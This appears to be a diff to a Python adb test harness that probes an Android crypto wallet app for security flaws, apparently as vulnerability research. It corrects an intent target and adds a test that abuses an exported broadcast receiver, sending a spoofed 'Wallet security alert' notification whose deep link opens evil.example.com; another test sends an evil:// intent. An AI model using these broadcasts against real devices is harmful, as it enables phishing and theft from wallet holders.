@@ -135,7 +135,11 @@ def fire(uri, tag):
 
 def fire_explicit(uri, tag):
     log(f"FIRE_EXPLICIT {tag}: {uri}")
-    o = sh("adb shell \"am start -W -n com.defi.wallet/com.defi.cronos.manager.TransferStationActivity"
+    # r11 FIX: the old component com.defi.cronos.manager.TransferStationActivity
+    # does not exist (r10: 'Error type 3' -> T7 controls were void). The real
+    # exported router is com.defi.wallet.app.TransferStationActivity (manifest
+    # line + am output of T1_CONTROL: 'Activity: com.defi.wallet/.app.TransferStationActivity').
+    o = sh("adb shell \"am start -W -n com.defi.wallet/com.defi.wallet.app.TransferStationActivity"
            f" -a android.intent.action.VIEW -d '{uri}'\"", 120)
     log(f"FIRE_EXPLICIT {tag} out: {' '.join(o.split())[:260]}")
     time.sleep(SLEEP)
@@ -177,18 +181,31 @@ def relaunch(tag):
     sh("adb shell am start -n com.defi.wallet/com.defi.wallet.feature.splash.SplashActivity", 60)
     time.sleep(SLEEP * 2)
 
-def ensure_wallet_fg(tag, tries=3):
+def ensure_wallet_fg(tag, tries=4):
     """r10 FIX (r9 bug): after the login probe the stub browser/launcher stayed
     resumed and T1-T9 ran against it — every test dump read 'Fake System App'.
-    Before each test the wallet itself must be THE resumed activity; relaunch
-    until it is (dump() dismisses any ANR dialog on top)."""
+    Before each test the wallet itself must be THE resumed activity.
+    r11: the ATD stub browser lives IN the wallet's own task and can steal the
+    top during/after a relaunch (r10 pre_t10: try0 read CronosOnBoarding, the
+    dump right after showed the stub) — try BACK first, then relaunch; each
+    dump() also dismisses any ANR dialog on top."""
     for i in range(tries):
         r = resumed()
         if PKG in r:
             dump(f"fg_{tag}_{i}")
             if PKG in resumed():
                 return True
-        log(f"FG {tag} try{i}: wallet not resumed -> relaunch ({r[:130]})")
+            r = resumed()
+        if "fakesystemapp" in r.lower():
+            log(f"FG {tag} try{i}: stub browser on top -> BACK")
+            back()
+            r = resumed()
+            if PKG in r:
+                dump(f"fg_{tag}_{i}b")
+                if PKG in resumed():
+                    return True
+                r = resumed()
+        log(f"FG {tag} try{i}: relaunch ({r[:130]})")
         relaunch(f"{tag}_{i}")
         dump(f"fg_{tag}_{i}")
     ok = PKG in resumed()
@@ -526,7 +543,7 @@ def t7_negatives():
     # a clean drop is recorded in `why` as a passed control, never as CONFIRMED.
     log("T7: explicit evil:// intent to TransferStation (expect validator drop)")
     r0 = resumed()
-    sh("adb shell \"am start -W -n com.defi.wallet/com.defi.cronos.manager.TransferStationActivity"
+    sh("adb shell \"am start -W -n com.defi.wallet/com.defi.wallet.app.TransferStationActivity"
        " -a android.intent.action.VIEW -d 'evil://x'\"", 60)
     time.sleep(SLEEP)
     x = dump("t7"); shot("t7")
@@ -542,6 +559,42 @@ def t7_negatives():
     moved = (r2 != r20)
     verdict_line("T7B_tc_prefix_accepted", moved,
                  f"validator_moved_screen={moved} resumed={r2[:150]}", ui_ok=True)
+
+def t12_broadcast_injection():
+    """r11 hypothesis, statically proven first (manifest + decompiled classes11):
+    exported LocalNotificationAlarmReceiver, action
+    com.defi.core.mediator.START_NOTIFICATION_ALARM, NO android:permission.
+    onReceive() reads header/body/routerUrl straight from any sender's intent
+    (no getSendingPackage check) -> b.b() -> background path builds the wallet
+    launch intent, M.setData(Uri.parse(routerUrl)) and posts the notification
+    with attacker title/body (WalletNotificationHelper.c).
+    Dynamic proof needed: spoofed wallet notification readable in the shade
+    (XML = the working evidence channel on ATD); tap routing is observational
+    (logcat 'intent in NotificationPush' + dumpsys). Pre-login by design."""
+    home(); time.sleep(6)   # background => system-notification path in b.b()
+    sh("adb shell dumpsys notification > %s/notif_before.txt 2>/dev/null" % OUT, 40)
+    o = sh("adb shell \"am broadcast -a com.defi.core.mediator.START_NOTIFICATION_ALARM "
+           "--es header 'URGENT: Wallet security alert' "
+           "--es body 'Your wallet is temporarily locked. Tap to restore access.' "
+           "--es routerUrl 'dfw://dapp/detail?dappUrl=https://evil.example.com' "
+           "--ei notificationId 4242\"", 40)
+    log(f"T12 broadcast out: {' '.join(o.split())[:250]}")
+    time.sleep(SLEEP)
+    sh("adb shell dumpsys notification > %s/notif_after.txt 2>/dev/null" % OUT, 40)
+    lc = sh("adb shell \"logcat -d -t 500 | grep -i LocalNotificationAlarmReceiver\"", 40)
+    log(f"T12 receiver log: {' '.join(lc.split())[:300]}")
+    # pull the shade and read it through the working channel (uiautomator XML)
+    sh("adb shell cmd statusbar expand-notifications", 20)
+    time.sleep(8)
+    x = dump("t12_shade")
+    t = txt(x)
+    spoof = any(k in t.lower() for k in ("wallet security alert", "restore access"))
+    hits = sh("grep -c \"URGENT: Wallet security alert\" %s/notif_after.txt 2>/dev/null || true" % OUT, 20)
+    sh("adb shell cmd statusbar collapse", 20)
+    time.sleep(4)
+    verdict_line("T12_exported_receiver_spoofed_notification", spoof,
+                 f"shade_ui={t[:300]} dumpsys_hit_lines={' '.join(hits.split())[:30]} "
+                 f"receiver_log={' '.join(lc.split())[:200]}")
 
 # ---------------------------------------------------------------- main
 def main():
@@ -577,8 +630,9 @@ def main():
     subprocess.Popen(rec_cmd, shell=True)
     log("recording started (14x170s segments)")
 
-    for tfn in (t1_control_risk, t1_bypass, t2_swap_prefill, t3_siblings,
-                t4_browser, t9_popup_chain, t6_rn_modules, t5_lock, t7_negatives):
+    for tfn in (t12_broadcast_injection, t1_control_risk, t1_bypass, t2_swap_prefill,
+                t3_siblings, t4_browser, t9_popup_chain, t6_rn_modules,
+                t5_lock, t7_negatives):
         ensure_wallet_fg(tfn.__name__)
         tfn()
 
